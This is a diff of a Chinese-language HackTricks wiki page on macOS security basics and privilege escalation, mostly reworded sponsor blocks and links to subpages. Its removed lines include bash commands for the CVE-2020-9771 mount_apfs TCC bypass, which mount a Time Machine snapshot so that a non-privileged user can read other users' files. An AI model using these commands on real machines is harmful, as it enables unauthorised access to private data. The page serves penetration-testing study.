@@ -2,36 +2,34 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof是所有加密漏洞赏金的家园。**
+加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！
 
-**即时获得奖励**\
-HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。
+**黑客见解**\
+参与深入探讨黑客的刺激和挑战的内容
 
-**在web3渗透测试中积累经验**\
-区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。
+**实时黑客新闻**\
+通过实时新闻和见解了解快节奏的黑客世界
 
-**成为web3黑客传奇**\
-每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。
+**最新公告**\
+了解最新的赏金任务发布和重要平台更新
 
-[**在HackenProof上注册**](https://hackenproof.com/register) 从您的黑客行动中获利！
+**加入我们的**[**Discord**](https://discord.com/invite/N3FrSbmwdy)，与顶级黑客一起合作！
 
-{% embed url="https://hackenproof.com/register" %}
+## 基本的MacOS知识
 
-## 基本的MacOS
-
-如果您对macOS不熟悉，您应该开始学习macOS的基础知识：
+如果你对macOS不熟悉，你应该开始学习macOS的基础知识：
 
 * 特殊的macOS**文件和权限：**
 
@@ -63,12 +61,12 @@ HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞
 [macos-protocols.md](macos-protocols.md)
 {% endcontent-ref %}
 
-* **开源**的macOS: [https://opensource.apple.com/](https://opensource.apple.com/)
-* 要下载`tar.gz`，请将URL从[https://opensource.apple.com/**source**/dyld/](https://opensource.apple.com/source/dyld/)更改为[https://opensource.apple.com/**tarballs**/dyld/**dyld-852.2.tar.gz**](https://opensource.apple.com/tarballs/dyld/dyld-852.2.tar.gz)
+* **开源**的macOS：[https://opensource.apple.com/](https://opensource.apple.com/)
+* 要下载一个`tar.gz`文件，将URL从[https://opensource.apple.com/**source**/dyld/](https://opensource.apple.com/source/dyld/)更改为[https://opensource.apple.com/**tarballs**/dyld/**dyld-852.2.tar.gz**](https://opensource.apple.com/tarballs/dyld/dyld-852.2.tar.gz)
 
 ### MacOS MDM
 
-在公司中，**macOS**系统很可能会通过MDM进行**管理**。因此，从攻击者的角度来看，了解**它是如何工作的**是很有意义的：
+在公司中，**macOS**系统很可能会被**MDM管理**。因此，从攻击者的角度来看，了解**它是如何工作的**是很有意义的：
 
 {% content-ref url="../macos-red-teaming/macos-mdm/" %}
 [macos-mdm](../macos-red-teaming/macos-mdm/)
@@ -90,7 +88,7 @@ HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞
 
 ### 文件权限
 
-如果以**root身份运行的进程**写入一个可以被用户控制的文件，用户可以利用这一点来**提升权限**。\
+如果以**root权限运行的进程**写入一个可以被用户控制的文件，用户可以利用这个漏洞**提升权限**。\
 这种情况可能发生在以下情况下：
 
 * 使用的文件已经由用户创建（由用户拥有）
@@ -98,75 +96,38 @@ HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞
 * 使用的文件位于用户拥有的目录中（用户可以创建文件）
 * 使用的文件位于由root拥有但用户具有写入权限的目录中（用户可以创建文件）
 
-能够**创建一个将被root使用的文件**，允许用户**利用其内容**甚至创建**符号链接/硬链接**将其指向另一个位置。
+能够**创建一个将被root使用的文件**，允许用户**利用其内容**，甚至创建**符号链接/硬链接**将其指向另一个位置。
 
 对于这种类型的漏洞，不要忘记**检查易受攻击的`.pkg`安装程序**：
 
 {% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
 [macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
 {% endcontent-ref %}
-### 权限滥用和特权升级通过进程滥用
-
-如果一个进程可以在另一个具有更高特权或权限的进程中注入代码或与其联系以执行特权操作，那么他可以升级特权并绕过防御措施，如[Sandbox](macos-security-protections/macos-sandbox/)或[TCC](macos-security-protections/macos-tcc/)。
-
-{% content-ref url="macos-proces-abuse/" %}
-[macos-proces-abuse](macos-proces-abuse/)
-{% endcontent-ref %}
-
 ### 文件扩展名和URL方案应用程序处理程序
 
-通过文件扩展名注册的奇怪应用程序可能会被滥用，不同的应用程序可以注册以打开特定的协议。
+通过文件扩展名注册的奇怪应用程序可能会被滥用，并且不同的应用程序可以注册以打开特定的协议。
 
 {% content-ref url="macos-file-extension-apps.md" %}
 [macos-file-extension-apps.md](macos-file-extension-apps.md)
 {% endcontent-ref %}
 
-## MacOS特权升级
+## macOS TCC / SIP权限提升
 
-### CVE-2020-9771 - mount\_apfs TCC绕过和特权升级
+在macOS中，**应用程序和二进制文件可以具有访问文件夹或设置的权限**，使它们比其他应用程序更具特权。
 
-**任何用户**（即使是非特权用户）都可以创建和挂载一个时间机器快照，并**访问该快照的所有文件**。\
-唯一需要的特权是所使用的应用程序（如`Terminal`）具有**完全磁盘访问权限**（FDA）（`kTCCServiceSystemPolicyAllfiles`），需要由管理员授予。
+因此，想要成功攻击macOS机器的攻击者将需要**提升其TCC权限**（甚至**绕过SIP**，取决于他的需求）。
 
-{% code overflow="wrap" %}
-```bash
-# Create snapshot
-tmutil localsnapshot
+这些权限通常以应用程序签名的**授权**形式给出，或者应用程序可能请求某些访问权限，经过**用户批准**后，这些权限可以在**TCC数据库**中找到。进程可以获得这些权限的另一种方式是作为具有这些权限的进程的**子进程**，因为它们通常是**继承**的。
 
-# List snapshots
-tmutil listlocalsnapshots /
-Snapshots for disk /:
-com.apple.TimeMachine.2023-05-29-001751.local
+请参阅以下链接，了解不同的方法来[**提升TCC权限**](macos-security-protections/macos-tcc/#tcc-privesc-and-bypasses)，[**绕过TCC**](macos-security-protections/macos-tcc/macos-tcc-bypasses/)以及过去如何[**绕过SIP**](macos-security-protections/macos-sip.md#sip-bypasses)。
 
-# Generate folder to mount it
-cd /tmp # I didn it from this folder
-mkdir /tmp/snap
+## macOS传统权限提升
 
-# Mount it, "noowners" will mount the folder so the current user can access everything
-/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
+当然，从红队的角度来看，您也应该对提升为root感兴趣。查看以下文章以获取一些提示：
 
-# Access it
-ls /tmp/snap/Users/admin_user # This will work
-```
-{% endcode %}
-
-更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**
-
-### 敏感信息
-
-{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
-[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
+{% content-ref url="macos-privilege-escalation.md" %}
+[macos-privilege-escalation.md](macos-privilege-escalation.md)
 {% endcontent-ref %}
-
-### Linux提权
-
-首先，请注意**大多数关于特权升级影响Linux/Unix的技巧也会影响MacOS**机器。所以请参考：
-
-{% content-ref url="../../linux-hardening/privilege-escalation/" %}
-[privilege-escalation](../../linux-hardening/privilege-escalation/)
-{% endcontent-ref %}
-
-## MacOS防御应用程序
 
 ## 参考资料
 
@@ -178,27 +139,25 @@ ls /tmp/snap/Users/admin_user # This will work
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof是所有加密漏洞赏金的家园。**
+加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和赏金猎人交流！
 
-**即时获得奖励**\
-HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。
+**黑客见解**\
+参与深入探讨黑客的刺激和挑战的内容
 
-**在web3渗透测试中积累经验**\
-区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。
+**实时黑客新闻**\
+通过实时新闻和见解了解快节奏的黑客世界
 
-**成为web3黑客传奇**\
-每次验证的漏洞都会获得声誉积分，并占领每周排行榜的榜首。
+**最新公告**\
+了解最新的赏金任务启动和重要平台更新
 
-[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！
-
-{% embed url="https://hackenproof.com/register" %}
+**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **，与顶级黑客一起合作！**
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
